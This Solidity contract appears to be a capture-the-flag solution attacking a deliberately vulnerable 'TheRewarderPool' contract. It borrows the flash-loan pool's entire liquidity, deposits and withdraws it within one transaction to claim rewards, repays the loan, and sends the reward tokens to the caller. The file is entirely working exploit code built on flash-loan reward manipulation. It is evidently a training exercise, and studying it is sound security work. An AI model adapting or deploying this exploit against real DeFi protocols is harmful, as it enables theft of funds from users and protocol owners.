// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {TheRewarderPool} from "./TheRewarderPool.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";

import {console} from "hardhat/console.sol";

contract TheRewarderPoolAttack {
    TheRewarderPool private immutable _THE_REWARDER_POOL;
    FlashLoanerPool private immutable _FLASH_LOANER_POOL;

    constructor(address theRewarderPool, address flashLoanerPool) {
        _THE_REWARDER_POOL = TheRewarderPool(theRewarderPool);
        _FLASH_LOANER_POOL = FlashLoanerPool(flashLoanerPool);
    }

    function attack() external {
        uint256 balance = _FLASH_LOANER_POOL.liquidityToken().balanceOf(address(_FLASH_LOANER_POOL));
        _FLASH_LOANER_POOL.flashLoan(balance);
        _THE_REWARDER_POOL.rewardToken().transfer(msg.sender, _THE_REWARDER_POOL.rewardToken().balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        _FLASH_LOANER_POOL.liquidityToken().approve(address(_THE_REWARDER_POOL), amount);
        _THE_REWARDER_POOL.deposit(amount);
        _THE_REWARDER_POOL.withdraw(amount);
        _FLASH_LOANER_POOL.liquidityToken().transfer(address(_FLASH_LOANER_POOL), amount);
    }
}
